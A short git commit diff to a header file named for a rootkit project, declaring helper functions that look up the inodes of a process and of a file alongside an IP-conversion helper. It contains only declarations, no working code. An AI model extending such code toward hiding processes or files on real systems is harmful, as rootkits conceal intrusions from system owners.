1fc4e1dbd5ce697990d3e27ee6f189579bc6f9ff
ViliamKovac1223 <viliamkovac1223@gmail.com>
2026-04-29 11:58:31 +0200

    add utils function for better inode reading

--- include/rootkit/Utils.hpp
+++ include/rootkit/Utils.hpp
@@ -1,13 +1,16 @@
 #ifndef ROOTKIT_UTILS_H
 #define ROOTKIT_UTILS_H
 
-#include <optional>
 #include <asm-generic/int-ll64.h>
+#include <optional>
 #include <string>
 #include <arpa/inet.h>
+#include <cstdint>
 
 namespace rootkit::utils {
     std::optional<__u32> convert_ip(const std::string& ip);
+    std::optional<uint64_t> get_inode_of_process(const pid_t pid);
+    std::optional<uint64_t> get_inode_of_file(const std::string& file_path);
 }
 
 #endif
